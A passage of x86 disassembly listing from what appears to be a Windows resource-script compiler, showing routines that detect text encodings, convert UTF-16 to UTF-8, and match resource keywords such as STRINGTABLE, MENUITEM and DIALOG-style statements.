  407d5a:	72 50                	jb     0x407dac
  407d5c:	e8 3e bf ff ff       	call   0x403c9f
  407d61:	ba 5c 08 00 00       	mov    $0x85c,%edx
  407d66:	72 44                	jb     0x407dac
  407d68:	09 c0                	or     %eax,%eax
  407d6a:	74 40                	je     0x407dac
  407d6c:	3d 00 01 00 00       	cmp    $0x100,%eax
  407d71:	72 5b                	jb     0x407dce
  407d73:	66 a3 78 ab 40 00    	mov    %ax,0x40ab78
  407d79:	c7 05 a8 aa 40 00 00 	movl   $0x0,0x40aaa8
  407d80:	00 00 00 
  407d83:	e8 36 fe ff ff       	call   0x407bbe
  407d88:	c3                   	ret
  407d89:	e8 b7 04 00 00       	call   0x408245
  407d8e:	73 3e                	jae    0x407dce
  407d90:	e8 fa c7 ff ff       	call   0x40458f
  407d95:	72 15                	jb     0x407dac
  407d97:	e8 6c bd ff ff       	call   0x403b08
  407d9c:	72 10                	jb     0x407dae
  407d9e:	e8 eb bd ff ff       	call   0x403b8e
  407da3:	72 94                	jb     0x407d39
  407da5:	74 b5                	je     0x407d5c
  407da7:	ba 5f 08 00 00       	mov    $0x85f,%edx
  407dac:	f9                   	stc
  407dad:	c3                   	ret
  407dae:	09 d2                	or     %edx,%edx
  407db0:	75 fa                	jne    0x407dac
  407db2:	89 1d 5c ab 40 00    	mov    %ebx,0x40ab5c
  407db8:	89 35 54 ab 40 00    	mov    %esi,0x40ab54
  407dbe:	ba 84 04 00 01       	mov    $0x1000484,%edx
  407dc3:	e8 2c c1 ff ff       	call   0x403ef4
  407dc8:	e8 f1 fd ff ff       	call   0x407bbe
  407dcd:	c3                   	ret
  407dce:	66 a3 78 ab 40 00    	mov    %ax,0x40ab78
  407dd4:	c7 05 a8 aa 40 00 00 	movl   $0x0,0x40aaa8
  407ddb:	00 00 00 
  407dde:	83 f8 03             	cmp    $0x3,%eax
  407de1:	76 28                	jbe    0x407e0b
  407de3:	83 f8 08             	cmp    $0x8,%eax
  407de6:	74 0c                	je     0x407df4
  407de8:	83 f8 0b             	cmp    $0xb,%eax
  407deb:	74 1e                	je     0x407e0b
  407ded:	83 f8 13             	cmp    $0x13,%eax
  407df0:	72 1f                	jb     0x407e11
  407df2:	eb 17                	jmp    0x407e0b
  407df4:	80 0d c7 ab 40 00 02 	orb    $0x2,0x40abc7
  407dfb:	83 3d 60 ab 40 00 00 	cmpl   $0x0,0x40ab60
  407e02:	74 07                	je     0x407e0b
  407e04:	ba 7b 08 00 02       	mov    $0x200087b,%edx
  407e09:	f9                   	stc
  407e0a:	c3                   	ret
  407e0b:	e8 2e ed ff ff       	call   0x406b3e
  407e10:	c3                   	ret
  407e11:	3c 04                	cmp    $0x4,%al
  407e13:	75 06                	jne    0x407e1b
  407e15:	e8 49 fb ff ff       	call   0x407963
  407e1a:	c3                   	ret
  407e1b:	3c 05                	cmp    $0x5,%al
  407e1d:	75 06                	jne    0x407e25
  407e1f:	e8 98 fc ff ff       	call   0x407abc
  407e24:	c3                   	ret
  407e25:	3c 09                	cmp    $0x9,%al
  407e27:	75 06                	jne    0x407e2f
  407e29:	e8 2a f1 ff ff       	call   0x406f58
  407e2e:	c3                   	ret
  407e2f:	3c 0a                	cmp    $0xa,%al
  407e31:	75 06                	jne    0x407e39
  407e33:	e8 86 fd ff ff       	call   0x407bbe
  407e38:	c3                   	ret
  407e39:	3c 10                	cmp    $0x10,%al
  407e3b:	75 06                	jne    0x407e43
  407e3d:	e8 95 f5 ff ff       	call   0x4073d7
  407e42:	c3                   	ret
  407e43:	3c 11                	cmp    $0x11,%al
  407e45:	75 06                	jne    0x407e4d
  407e47:	e8 3c f5 ff ff       	call   0x407388
  407e4c:	c3                   	ret
  407e4d:	f9                   	stc
  407e4e:	ba 3f 08 00 04       	mov    $0x400083f,%edx
  407e53:	c3                   	ret
  407e54:	f6 05 c7 ab 40 00 02 	testb  $0x2,0x40abc7
  407e5b:	74 00                	je     0x407e5d
  407e5d:	e8 35 e7 ff ff       	call   0x406597
  407e62:	72 16                	jb     0x407e7a
  407e64:	8b 1d 78 aa 40 00    	mov    0x40aa78,%ebx
  407e6a:	2b 1d 70 aa 40 00    	sub    0x40aa70,%ebx
  407e70:	83 fb 20             	cmp    $0x20,%ebx
  407e73:	75 0a                	jne    0x407e7f
  407e75:	ba 03 18 01 00       	mov    $0x11803,%edx
  407e7a:	e8 75 c0 ff ff       	call   0x403ef4
  407e7f:	c3                   	ret
  407e80:	e8 2f a2 00 00       	call   0x4120b4
  407e85:	66 a3 7a ab 40 00    	mov    %ax,0x40ab7a
  407e8b:	6a 04                	push   $0x4
  407e8d:	68 00 20 00 00       	push   $0x2000
  407e92:	68 00 00 10 00       	push   $0x100000
  407e97:	6a 00                	push   $0x0
  407e99:	e8 b0 a1 00 00       	call   0x41204e
  407e9e:	09 c0                	or     %eax,%eax
  407ea0:	75 0b                	jne    0x407ead
  407ea2:	ba 8a 18 01 00       	mov    $0x1188a,%edx
  407ea7:	e8 48 c0 ff ff       	call   0x403ef4
  407eac:	c3                   	ret
  407ead:	8b 0d 94 aa 40 00    	mov    0x40aa94,%ecx
  407eb3:	29 f9                	sub    %edi,%ecx
  407eb5:	a3 44 ab 40 00       	mov    %eax,0x40ab44
  407eba:	a3 48 ab 40 00       	mov    %eax,0x40ab48
  407ebf:	a3 4c ab 40 00       	mov    %eax,0x40ab4c
  407ec4:	c7 05 0c ab 40 00 01 	movl   $0x1,0x40ab0c
  407ecb:	00 00 00 
  407ece:	e8 8b fd ff ff       	call   0x407c5e
  407ed3:	72 20                	jb     0x407ef5
  407ed5:	09 c9                	or     %ecx,%ecx
  407ed7:	75 f5                	jne    0x407ece
  407ed9:	e8 66 ae ff ff       	call   0x402d44
  407ede:	75 ee                	jne    0x407ece
  407ee0:	e8 6f ff ff ff       	call   0x407e54
  407ee5:	72 13                	jb     0x407efa
  407ee7:	83 3d f4 aa 40 00 00 	cmpl   $0x0,0x40aaf4
  407eee:	74 0a                	je     0x407efa
  407ef0:	ba 05 14 01 00       	mov    $0x11405,%edx
  407ef5:	e8 fa bf ff ff       	call   0x403ef4
  407efa:	68 00 40 00 00       	push   $0x4000
  407eff:	68 00 00 01 00       	push   $0x10000
  407f04:	ff 35 44 ab 40 00    	push   0x40ab44
  407f0a:	e8 63 a1 00 00       	call   0x412072
  407f0f:	68 00 80 00 00       	push   $0x8000
  407f14:	6a 00                	push   $0x0
  407f16:	ff 35 44 ab 40 00    	push   0x40ab44
  407f1c:	e8 51 a1 00 00       	call   0x412072
  407f21:	c6 05 c5 ab 40 00 00 	movb   $0x0,0x40abc5
  407f28:	c6 05 c6 ab 40 00 00 	movb   $0x0,0x40abc6
  407f2f:	c6 05 c7 ab 40 00 00 	movb   $0x0,0x40abc7
  407f36:	c6 05 c8 ab 40 00 00 	movb   $0x0,0x40abc8
  407f3d:	c3                   	ret
  407f3e:	68 00 01 00 00       	push   $0x100
  407f43:	68 c0 ef 40 00       	push   $0x40efc0
  407f48:	68 7b ac 40 00       	push   $0x40ac7b
  407f4d:	e8 68 a1 00 00       	call   0x4120ba
  407f52:	09 c0                	or     %eax,%eax
  407f54:	74 25                	je     0x407f7b
  407f56:	05 c0 ef 40 00       	add    $0x40efc0,%eax
  407f5b:	80 78 ff 5c          	cmpb   $0x5c,-0x1(%eax)
  407f5f:	74 04                	je     0x407f65
  407f61:	c6 00 5c             	movb   $0x5c,(%eax)
  407f64:	40                   	inc    %eax
  407f65:	a3 80 aa 40 00       	mov    %eax,0x40aa80
  407f6a:	2d c0 ef 40 00       	sub    $0x40efc0,%eax
  407f6f:	2d 00 01 00 00       	sub    $0x100,%eax
  407f74:	f7 d8                	neg    %eax
  407f76:	a3 84 aa 40 00       	mov    %eax,0x40aa84
  407f7b:	c3                   	ret
  407f7c:	29 d3                	sub    %edx,%ebx
  407f7e:	77 2e                	ja     0x407fae
  407f80:	50                   	push   %eax
  407f81:	51                   	push   %ecx
  407f82:	52                   	push   %edx
  407f83:	6a 04                	push   $0x4
  407f85:	68 00 10 00 00       	push   $0x1000
  407f8a:	68 00 10 00 00       	push   $0x1000
  407f8f:	57                   	push   %edi
  407f90:	e8 b9 a0 00 00       	call   0x41204e
  407f95:	5a                   	pop    %edx
  407f96:	09 c0                	or     %eax,%eax
  407f98:	74 09                	je     0x407fa3
  407f9a:	bb 00 10 00 00       	mov    $0x1000,%ebx
  407f9f:	29 d3                	sub    %edx,%ebx
  407fa1:	eb 09                	jmp    0x407fac
  407fa3:	01 d3                	add    %edx,%ebx
  407fa5:	ba 8a 18 01 00       	mov    $0x1188a,%edx
  407faa:	31 c9                	xor    %ecx,%ecx
  407fac:	59                   	pop    %ecx
  407fad:	58                   	pop    %eax
  407fae:	c3                   	ret
  407faf:	31 c0                	xor    %eax,%eax
  407fb1:	83 f9 02             	cmp    $0x2,%ecx
  407fb4:	72 5c                	jb     0x408012
  407fb6:	66 ad                	lods   %ds:(%esi),%ax
  407fb8:	83 e9 02             	sub    $0x2,%ecx
  407fbb:	83 f8 7f             	cmp    $0x7f,%eax
  407fbe:	77 0f                	ja     0x407fcf
  407fc0:	ba 01 00 00 00       	mov    $0x1,%edx
  407fc5:	e8 b2 ff ff ff       	call   0x407f7c
  407fca:	74 46                	je     0x408012
  407fcc:	aa                   	stos   %al,%es:(%edi)
  407fcd:	eb e2                	jmp    0x407fb1
  407fcf:	3d ff 07 00 00       	cmp    $0x7ff,%eax
  407fd4:	77 1d                	ja     0x407ff3
  407fd6:	ba 02 00 00 00       	mov    $0x2,%edx
  407fdb:	e8 9c ff ff ff       	call   0x407f7c
  407fe0:	74 30                	je     0x408012
  407fe2:	89 c2                	mov    %eax,%edx
  407fe4:	c1 e8 06             	shr    $0x6,%eax
  407fe7:	0c c0                	or     $0xc0,%al
  407fe9:	aa                   	stos   %al,%es:(%edi)
  407fea:	89 d0                	mov    %edx,%eax
  407fec:	24 3f                	and    $0x3f,%al
  407fee:	0c 80                	or     $0x80,%al
  407ff0:	aa                   	stos   %al,%es:(%edi)
  407ff1:	eb be                	jmp    0x407fb1
  407ff3:	ba 03 00 00 00       	mov    $0x3,%edx
  407ff8:	e8 7f ff ff ff       	call   0x407f7c
  407ffd:	74 13                	je     0x408012
  407fff:	89 c2                	mov    %eax,%edx
  408001:	c1 e8 0c             	shr    $0xc,%eax
  408004:	0c e0                	or     $0xe0,%al
  408006:	aa                   	stos   %al,%es:(%edi)
  408007:	89 d0                	mov    %edx,%eax
  408009:	c1 e8 06             	shr    $0x6,%eax
  40800c:	24 3f                	and    $0x3f,%al
  40800e:	0c 80                	or     $0x80,%al
  408010:	eb d7                	jmp    0x407fe9
  408012:	c3                   	ret
  408013:	51                   	push   %ecx
  408014:	89 c8                	mov    %ecx,%eax
  408016:	c1 e0 02             	shl    $0x2,%eax
  408019:	e8 7b bd ff ff       	call   0x403d99
  40801e:	59                   	pop    %ecx
  40801f:	72 30                	jb     0x408051
  408021:	50                   	push   %eax
  408022:	89 fe                	mov    %edi,%esi
  408024:	89 c7                	mov    %eax,%edi
  408026:	c7 05 98 aa 40 00 00 	movl   $0x1000,0x40aa98
  40802d:	10 00 00 
  408030:	8b 1d 98 aa 40 00    	mov    0x40aa98,%ebx
  408036:	e8 74 ff ff ff       	call   0x407faf
  40803b:	89 1d 98 aa 40 00    	mov    %ebx,0x40aa98
  408041:	e8 a6 a8 ff ff       	call   0x4028ec
  408046:	89 f9                	mov    %edi,%ecx
  408048:	5f                   	pop    %edi
  408049:	89 3d 90 aa 40 00    	mov    %edi,0x40aa90
  40804f:	29 f9                	sub    %edi,%ecx
  408051:	c3                   	ret
  408052:	51                   	push   %ecx
  408053:	89 c8                	mov    %ecx,%eax
  408055:	c1 e0 02             	shl    $0x2,%eax
  408058:	e8 3c bd ff ff       	call   0x403d99
  40805d:	59                   	pop    %ecx
  40805e:	72 2f                	jb     0x40808f
  408060:	50                   	push   %eax
  408061:	56                   	push   %esi
  408062:	89 fe                	mov    %edi,%esi
  408064:	89 c7                	mov    %eax,%edi
  408066:	c7 05 98 aa 40 00 00 	movl   $0x1000,0x40aa98
  40806d:	10 00 00 
  408070:	8b 1d 98 aa 40 00    	mov    0x40aa98,%ebx
  408076:	e8 34 ff ff ff       	call   0x407faf
  40807b:	89 1d 98 aa 40 00    	mov    %ebx,0x40aa98
  408081:	5e                   	pop    %esi
  408082:	e8 da 9c ff ff       	call   0x401d61
  408087:	89 f9                	mov    %edi,%ecx
  408089:	5f                   	pop    %edi
  40808a:	89 7e 1c             	mov    %edi,0x1c(%esi)
  40808d:	29 f9                	sub    %edi,%ecx
  40808f:	c3                   	ret
  408090:	8b 0d 94 aa 40 00    	mov    0x40aa94,%ecx
  408096:	8b 3d 90 aa 40 00    	mov    0x40aa90,%edi
  40809c:	29 f9                	sub    %edi,%ecx
  40809e:	83 f9 02             	cmp    $0x2,%ecx
  4080a1:	72 54                	jb     0x4080f7
  4080a3:	66 8b 07             	mov    (%edi),%ax
  4080a6:	66 3d ff fe          	cmp    $0xfeff,%ax
  4080aa:	74 2e                	je     0x4080da
  4080ac:	66 3d fe ff          	cmp    $0xfffe,%ax
  4080b0:	74 47                	je     0x4080f9
  4080b2:	08 c0                	or     %al,%al
  4080b4:	74 43                	je     0x4080f9
  4080b6:	08 e4                	or     %ah,%ah
  4080b8:	74 3f                	je     0x4080f9
  4080ba:	83 f9 03             	cmp    $0x3,%ecx
  4080bd:	72 38                	jb     0x4080f7
  4080bf:	66 3d ef bb          	cmp    $0xbbef,%ax
  4080c3:	75 32                	jne    0x4080f7
  4080c5:	80 7f 02 bf          	cmpb   $0xbf,0x2(%edi)
  4080c9:	75 2c                	jne    0x4080f7
  4080cb:	83 c7 03             	add    $0x3,%edi
  4080ce:	83 e9 03             	sub    $0x3,%ecx
  4080d1:	80 0d c4 ab 40 00 02 	orb    $0x2,0x40abc4
  4080d8:	eb 14                	jmp    0x4080ee
  4080da:	83 c7 02             	add    $0x2,%edi
  4080dd:	83 e9 02             	sub    $0x2,%ecx
  4080e0:	e8 2e ff ff ff       	call   0x408013
  4080e5:	72 23                	jb     0x40810a
  4080e7:	80 0d c4 ab 40 00 04 	orb    $0x4,0x40abc4
  4080ee:	89 f8                	mov    %edi,%eax
  4080f0:	01 c8                	add    %ecx,%eax
  4080f2:	a3 94 aa 40 00       	mov    %eax,0x40aa94
  4080f7:	f8                   	clc
  4080f8:	c3                   	ret
  4080f9:	be b0 93 40 00       	mov    $0x4093b0,%esi
  4080fe:	e8 be 90 ff ff       	call   0x4011c1
  408103:	b8 02 00 00 00       	mov    $0x2,%eax
  408108:	eb 05                	jmp    0x40810f
  40810a:	b8 01 00 00 00       	mov    $0x1,%eax
  40810f:	f9                   	stc
  408110:	c3                   	ret
  408111:	c6 46 24 00          	movb   $0x0,0x24(%esi)
  408115:	8b 4e 30             	mov    0x30(%esi),%ecx
  408118:	8b 7e 18             	mov    0x18(%esi),%edi
  40811b:	83 f9 02             	cmp    $0x2,%ecx
  40811e:	72 4b                	jb     0x40816b
  408120:	66 8b 07             	mov    (%edi),%ax
  408123:	66 3d ff fe          	cmp    $0xfeff,%ax
  408127:	74 2b                	je     0x408154
  408129:	66 3d fe ff          	cmp    $0xfffe,%ax
  40812d:	74 3e                	je     0x40816d
  40812f:	08 c0                	or     %al,%al
  408131:	74 3a                	je     0x40816d
  408133:	08 e4                	or     %ah,%ah
  408135:	74 36                	je     0x40816d
  408137:	83 f9 03             	cmp    $0x3,%ecx
  40813a:	72 2f                	jb     0x40816b
  40813c:	66 3d ef bb          	cmp    $0xbbef,%ax
  408140:	75 29                	jne    0x40816b
  408142:	80 7f 02 bf          	cmpb   $0xbf,0x2(%edi)
  408146:	75 23                	jne    0x40816b
  408148:	83 c7 03             	add    $0x3,%edi
  40814b:	83 e9 03             	sub    $0x3,%ecx
  40814e:	c6 46 24 02          	movb   $0x2,0x24(%esi)
  408152:	eb 11                	jmp    0x408165
  408154:	83 c7 02             	add    $0x2,%edi
  408157:	83 e9 02             	sub    $0x2,%ecx
  40815a:	e8 f3 fe ff ff       	call   0x408052
  40815f:	72 1b                	jb     0x40817c
  408161:	c6 46 24 04          	movb   $0x4,0x24(%esi)
  408165:	89 7e 18             	mov    %edi,0x18(%esi)
  408168:	89 4e 30             	mov    %ecx,0x30(%esi)
  40816b:	f8                   	clc
  40816c:	c3                   	ret
  40816d:	ba 93 18 00 08       	mov    $0x8001893,%edx
  408172:	83 3e 03             	cmpl   $0x3,(%esi)
  408175:	74 05                	je     0x40817c
  408177:	ba 93 14 00 08       	mov    $0x8001493,%edx
  40817c:	f9                   	stc
  40817d:	c3                   	ret
  40817e:	55                   	push   %ebp
  40817f:	53                   	push   %ebx
  408180:	51                   	push   %ecx
  408181:	56                   	push   %esi
  408182:	3d 64 cb 40 00       	cmp    $0x40cb64,%eax
  408187:	75 18                	jne    0x4081a1
  408189:	83 fb 03             	cmp    $0x3,%ebx
  40818c:	76 13                	jbe    0x4081a1
  40818e:	66 81 3e 52 54       	cmpw   $0x5452,(%esi)
  408193:	75 0c                	jne    0x4081a1
  408195:	80 7e 02 5f          	cmpb   $0x5f,0x2(%esi)
  408199:	75 06                	jne    0x4081a1
  40819b:	83 eb 03             	sub    $0x3,%ebx
  40819e:	83 c6 03             	add    $0x3,%esi
  4081a1:	89 dd                	mov    %ebx,%ebp
  4081a3:	89 d9                	mov    %ebx,%ecx
  4081a5:	3b 48 04             	cmp    0x4(%eax),%ecx
  4081a8:	77 32                	ja     0x4081dc
  4081aa:	2b 08                	sub    (%eax),%ecx
  4081ac:	72 2e                	jb     0x4081dc
  4081ae:	8b 5c 88 08          	mov    0x8(%eax,%ecx,4),%ebx
  4081b2:	31 c9                	xor    %ecx,%ecx
  4081b4:	8a 0b                	mov    (%ebx),%cl
  4081b6:	e3 24                	jecxz  0x4081dc
  4081b8:	83 c3 02             	add    $0x2,%ebx
  4081bb:	31 d2                	xor    %edx,%edx
  4081bd:	8a 04 16             	mov    (%esi,%edx,1),%al
  4081c0:	38 04 13             	cmp    %al,(%ebx,%edx,1)
  4081c3:	77 17                	ja     0x4081dc
  4081c5:	72 10                	jb     0x4081d7
  4081c7:	42                   	inc    %edx
  4081c8:	39 ea                	cmp    %ebp,%edx
  4081ca:	75 f1                	jne    0x4081bd
  4081cc:	8a 43 ff             	mov    -0x1(%ebx),%al
  4081cf:	25 ff 00 00 00       	and    $0xff,%eax
  4081d4:	f8                   	clc
  4081d5:	eb 06                	jmp    0x4081dd
  4081d7:	01 eb                	add    %ebp,%ebx
  4081d9:	43                   	inc    %ebx
  4081da:	e2 df                	loop   0x4081bb
  4081dc:	f9                   	stc
  4081dd:	5e                   	pop    %esi
  4081de:	59                   	pop    %ecx
  4081df:	5b                   	pop    %ebx
  4081e0:	5d                   	pop    %ebp
  4081e1:	c3                   	ret
  4081e2:	53                   	push   %ebx
  4081e3:	56                   	push   %esi
  4081e4:	51                   	push   %ecx
  4081e5:	57                   	push   %edi
  4081e6:	8b 08                	mov    (%eax),%ecx
  4081e8:	29 cb                	sub    %ecx,%ebx
  4081ea:	76 0b                	jbe    0x4081f7
  4081ec:	83 c0 04             	add    $0x4,%eax
  4081ef:	89 c7                	mov    %eax,%edi
  4081f1:	01 c8                	add    %ecx,%eax
  4081f3:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  4081f5:	74 05                	je     0x4081fc
  4081f7:	5f                   	pop    %edi
  4081f8:	59                   	pop    %ecx
  4081f9:	f9                   	stc
  4081fa:	eb 07                	jmp    0x408203
  4081fc:	5f                   	pop    %edi
  4081fd:	59                   	pop    %ecx
  4081fe:	e8 7b ff ff ff       	call   0x40817e
  408203:	5e                   	pop    %esi
  408204:	5b                   	pop    %ebx
  408205:	c3                   	ret
  408206:	80 fb 08             	cmp    $0x8,%bl
  408209:	75 15                	jne    0x408220
  40820b:	81 3e 4c 41 4e 47    	cmpl   $0x474e414c,(%esi)
  408211:	75 2c                	jne    0x40823f
  408213:	81 7e 04 55 41 47 45 	cmpl   $0x45474155,0x4(%esi)
  40821a:	75 23                	jne    0x40823f
  40821c:	30 c0                	xor    %al,%al
  40821e:	eb 23                	jmp    0x408243
  408220:	80 fb 0b             	cmp    $0xb,%bl
  408223:	75 1a                	jne    0x40823f
  408225:	81 3e 53 54 52 49    	cmpl   $0x49525453,(%esi)
  40822b:	75 12                	jne    0x40823f
  40822d:	81 7e 04 4e 47 54 41 	cmpl   $0x4154474e,0x4(%esi)
  408234:	75 09                	jne    0x40823f
  408236:	81 7e 07 41 42 4c 45 	cmpl   $0x454c4241,0x7(%esi)
  40823d:	74 02                	je     0x408241
  40823f:	f9                   	stc
  408240:	c3                   	ret
  408241:	b0 06                	mov    $0x6,%al
  408243:	f8                   	clc
  408244:	c3                   	ret
  408245:	53                   	push   %ebx
  408246:	56                   	push   %esi
  408247:	e8 73 aa ff ff       	call   0x402cbf
  40824c:	75 31                	jne    0x40827f
  40824e:	be ec ab 40 00       	mov    $0x40abec,%esi
  408253:	b8 64 cb 40 00       	mov    $0x40cb64,%eax
  408258:	e8 21 ff ff ff       	call   0x40817e
  40825d:	72 20                	jb     0x40827f
  40825f:	83 f8 04             	cmp    $0x4,%eax
  408262:	75 07                	jne    0x40826b
  408264:	83 fb 06             	cmp    $0x6,%ebx
  408267:	74 0c                	je     0x408275
  408269:	eb 11                	jmp    0x40827c
  40826b:	83 f8 05             	cmp    $0x5,%eax
  40826e:	75 0c                	jne    0x40827c
  408270:	83 fb 08             	cmp    $0x8,%ebx
  408273:	75 07                	jne    0x40827c
  408275:	80 0d c7 ab 40 00 20 	orb    $0x20,0x40abc7
  40827c:	f8                   	clc
  40827d:	eb 01                	jmp    0x408280
  40827f:	f9                   	stc
  408280:	5e                   	pop    %esi
  408281:	5b                   	pop    %ebx
  408282:	c3                   	ret
  408283:	80 fb 04             	cmp    $0x4,%bl
  408286:	75 18                	jne    0x4082a0
  408288:	3c 05                	cmp    $0x5,%al
  40828a:	75 12                	jne    0x40829e
  40828c:	81 3e 46 4f 4e 54    	cmpl   $0x544e4f46,(%esi)
  408292:	74 79                	je     0x40830d
  408294:	b0 03                	mov    $0x3,%al
  408296:	81 3e 4d 45 4e 55    	cmpl   $0x554e454d,(%esi)
  40829c:	74 6d                	je     0x40830b
  40829e:	eb 69                	jmp    0x408309
  4082a0:	80 fb 05             	cmp    $0x5,%bl
  4082a3:	75 24                	jne    0x4082c9
  4082a5:	3c 05                	cmp    $0x5,%al
  4082a7:	75 60                	jne    0x408309
  4082a9:	81 3e 43 4c 41 53    	cmpl   $0x53414c43,(%esi)
  4082af:	75 06                	jne    0x4082b7
  4082b1:	80 7e 04 53          	cmpb   $0x53,0x4(%esi)
  4082b5:	74 56                	je     0x40830d
  4082b7:	b0 06                	mov    $0x6,%al
  4082b9:	81 3e 53 54 59 4c    	cmpl   $0x4c595453,(%esi)
  4082bf:	75 48                	jne    0x408309
  4082c1:	80 7e 04 45          	cmpb   $0x45,0x4(%esi)
  4082c5:	74 44                	je     0x40830b
  4082c7:	eb 40                	jmp    0x408309
  4082c9:	80 fb 07             	cmp    $0x7,%bl
  4082cc:	75 41                	jne    0x40830f
  4082ce:	81 3e 56 45 52 53    	cmpl   $0x53524556,(%esi)
  4082d4:	75 09                	jne    0x4082df
  4082d6:	81 7e 03 53 49 4f 4e 	cmpl   $0x4e4f4953,0x3(%esi)
  4082dd:	74 2e                	je     0x40830d
  4082df:	3c 05                	cmp    $0x5,%al
  4082e1:	75 26                	jne    0x408309
  4082e3:	b0 01                	mov    $0x1,%al
  4082e5:	81 3e 43 41 50 54    	cmpl   $0x54504143,(%esi)
  4082eb:	75 09                	jne    0x4082f6
  4082ed:	81 7e 03 54 49 4f 4e 	cmpl   $0x4e4f4954,0x3(%esi)
  4082f4:	74 15                	je     0x40830b
  4082f6:	b0 02                	mov    $0x2,%al
  4082f8:	81 3e 45 58 53 54    	cmpl   $0x54535845,(%esi)
  4082fe:	75 09                	jne    0x408309
  408300:	81 7e 03 54 59 4c 45 	cmpl   $0x454c5954,0x3(%esi)
  408307:	74 02                	je     0x40830b
  408309:	eb 48                	jmp    0x408353
  40830b:	eb 44                	jmp    0x408351
  40830d:	eb 40                	jmp    0x40834f
  40830f:	80 fb 08             	cmp    $0x8,%bl
  408312:	75 13                	jne    0x408327
  408314:	81 3e 4c 41 4e 47    	cmpl   $0x474e414c,(%esi)
  40831a:	75 37                	jne    0x408353
  40831c:	81 7e 04 55 41 47 45 	cmpl   $0x45474155,0x4(%esi)
  408323:	74 2a                	je     0x40834f
  408325:	eb 2c                	jmp    0x408353
  408327:	80 fb 0f             	cmp    $0xf,%bl
  40832a:	75 27                	jne    0x408353
  40832c:	81 3e 43 48 41 52    	cmpl   $0x52414843,(%esi)
  408332:	75 1f                	jne    0x408353
  408334:	81 7e 04 41 43 54 45 	cmpl   $0x45544341,0x4(%esi)
  40833b:	75 16                	jne    0x408353
  40833d:	81 7e 08 52 49 53 54 	cmpl   $0x54534952,0x8(%esi)
  408344:	75 0d                	jne    0x408353
  408346:	81 7e 0b 54 49 43 53 	cmpl   $0x53434954,0xb(%esi)
  40834d:	75 04                	jne    0x408353
  40834f:	88 d8                	mov    %bl,%al
  408351:	f8                   	clc
  408352:	c3                   	ret
  408353:	f9                   	stc
  408354:	c3                   	ret
  408355:	80 fb 0f             	cmp    $0xf,%bl
  408358:	75 16                	jne    0x408370
  40835a:	51                   	push   %ecx
  40835b:	57                   	push   %edi
  40835c:	56                   	push   %esi
  40835d:	89 d9                	mov    %ebx,%ecx
  40835f:	bf 6c ac 40 00       	mov    $0x40ac6c,%edi
  408364:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  408366:	5e                   	pop    %esi
  408367:	5f                   	pop    %edi
  408368:	59                   	pop    %ecx
  408369:	75 05                	jne    0x408370
  40836b:	b8 01 00 00 00       	mov    $0x1,%eax
  408370:	c3                   	ret
  408371:	80 fb 05             	cmp    $0x5,%bl
  408374:	75 0c                	jne    0x408382
  408376:	81 3e 42 4c 4f 43    	cmpl   $0x434f4c42,(%esi)
  40837c:	75 04                	jne    0x408382
  40837e:	80 7e 04 4b          	cmpb   $0x4b,0x4(%esi)
  408382:	c3                   	ret
  408383:	80 fb 05             	cmp    $0x5,%bl
  408386:	75 0c                	jne    0x408394
  408388:	81 3e 56 41 4c 55    	cmpl   $0x554c4156,(%esi)
  40838e:	75 04                	jne    0x408394
  408390:	80 7e 04 45          	cmpb   $0x45,0x4(%esi)
  408394:	c3                   	ret
  408395:	80 fb 01             	cmp    $0x1,%bl
  408398:	75 05                	jne    0x40839f
  40839a:	80 3e 7b             	cmpb   $0x7b,(%esi)
  40839d:	74 11                	je     0x4083b0
  40839f:	80 fb 05             	cmp    $0x5,%bl
  4083a2:	75 0c                	jne    0x4083b0
  4083a4:	81 3e 42 45 47 49    	cmpl   $0x49474542,(%esi)
  4083aa:	75 04                	jne    0x4083b0
  4083ac:	80 7e 04 4e          	cmpb   $0x4e,0x4(%esi)
  4083b0:	c3                   	ret
  4083b1:	80 fb 01             	cmp    $0x1,%bl
  4083b4:	75 05                	jne    0x4083bb
  4083b6:	80 3e 7d             	cmpb   $0x7d,(%esi)
  4083b9:	74 10                	je     0x4083cb
  4083bb:	80 fb 03             	cmp    $0x3,%bl
  4083be:	75 0b                	jne    0x4083cb
  4083c0:	66 81 3e 45 4e       	cmpw   $0x4e45,(%esi)
  4083c5:	75 04                	jne    0x4083cb
  4083c7:	80 7e 02 44          	cmpb   $0x44,0x2(%esi)
  4083cb:	c3                   	ret
  4083cc:	80 fb 08             	cmp    $0x8,%bl
  4083cf:	75 0f                	jne    0x4083e0
  4083d1:	81 3e 4d 45 4e 55    	cmpl   $0x554e454d,(%esi)
  4083d7:	75 07                	jne    0x4083e0
  4083d9:	81 7e 04 49 54 45 4d 	cmpl   $0x4d455449,0x4(%esi)
  4083e0:	c3                   	ret
  4083e1:	80 fb 05             	cmp    $0x5,%bl
  4083e4:	75 0c                	jne    0x4083f2
  4083e6:	81 3e 50 4f 50 55    	cmpl   $0x55504f50,(%esi)
  4083ec:	75 04                	jne    0x4083f2
  4083ee:	80 7e 04 50          	cmpb   $0x50,0x4(%esi)
  4083f2:	c3                   	ret
  4083f3:	50                   	push   %eax
  4083f4:	89 02                	mov    %eax,(%edx)
  4083f6:	01 cb                	add    %ecx,%ebx
  4083f8:	89 5a 04             	mov    %ebx,0x4(%edx)
  4083fb:	89 72 08             	mov    %esi,0x8(%edx)
  4083fe:	b8 04 00 00 00       	mov    $0x4,%eax
  408403:	c7 44 82 0c 00 00 00 	movl   $0x0,0xc(%edx,%eax,4)
  40840a:	00 
  40840b:	48                   	dec    %eax
  40840c:	79 f5                	jns    0x408403
  40840e:	f6 05 c9 ab 40 00 08 	testb  $0x8,0x40abc9
  408415:	74 08                	je     0x40841f
  408417:	66 c7 42 14 01 00    	movw   $0x1,0x14(%edx)
  40841d:	eb 2b                	jmp    0x40844a
  40841f:	8b 1d 0c ab 40 00    	mov    0x40ab0c,%ebx
  408425:	f6 05 c9 ab 40 00 02 	testb  $0x2,0x40abc9
  40842c:	74 0a                	je     0x408438
  40842e:	8b 1d 88 aa 40 00    	mov    0x40aa88,%ebx
  408434:	66 8b 5b 36          	mov    0x36(%ebx),%bx
  408438:	66 89 5a 16          	mov    %bx,0x16(%edx)
  40843c:	a1 88 aa 40 00       	mov    0x40aa88,%eax
  408441:	e8 9e ba ff ff       	call   0x403ee4
  408446:	66 89 42 14          	mov    %ax,0x14(%edx)
  40844a:	58                   	pop    %eax
  40844b:	c3                   	ret
  40844c:	e8 b8 bf ff ff       	call   0x404409
  408451:	ba 29 08 40 00       	mov    $0x400829,%edx
  408456:	72 7c                	jb     0x4084d4
